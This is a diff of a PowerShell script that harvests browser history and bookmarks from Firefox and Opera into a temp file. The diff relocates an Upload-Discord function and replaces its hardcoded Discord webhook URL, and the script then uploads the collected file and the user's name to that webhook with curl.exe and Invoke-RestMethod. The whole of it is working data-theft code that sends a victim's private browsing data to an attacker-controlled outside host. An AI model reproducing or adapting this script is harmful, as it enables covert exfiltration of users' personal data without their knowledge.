@@ -11,6 +11,32 @@
 # _________________________________|_________________________________________________#
 ######################################################################################
 
+
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+    
+    $hookurl = 'https://discord.com/api/webhooks/1163420508080046210/_JS4fTqeQMKlZrRcSyI89NbCrTfObrDnfg5Ru3hschtnAb69VXcw_AlguWzw0suXEcW5'
+    
+    $Body = @{
+      'username' = $env:username
+      'content' = $text
+    }
+    
+    if (-not ([string]::IsNullOrEmpty($text))){
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+    
+    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+    
+    }
+ 
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------   
 function Get-BrowserData {
 
     [CmdletBinding()]
@@ -53,31 +79,6 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData
 Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
-#-----------------------------------------------------------------------------------------------------------------------------------------------------------
-function Upload-Discord {
-
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0,Mandatory=$False)]
-        [string]$file,
-        [parameter(Position=1,Mandatory=$False)]
-        [string]$text 
-    )
-    
-    $hookurl = 'https://discord.com/api/webhooks/1163054013764354070/sqBGY4atsyUZ4r02mGZtfLMbEv60J7_6fAhc2QLulpNNx7PgDl3z6f1yrZkpleiklMyK'
-    
-    $Body = @{
-      'username' = $env:username
-      'content' = $text
-    }
-    
-    if (-not ([string]::IsNullOrEmpty($text))){
-    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-    
-    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-    
-    }
-    
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
 #File Sent
 Upload-Discord -text " ```Browser Data``` " -file $Env:TMP\--BrowserData.txt
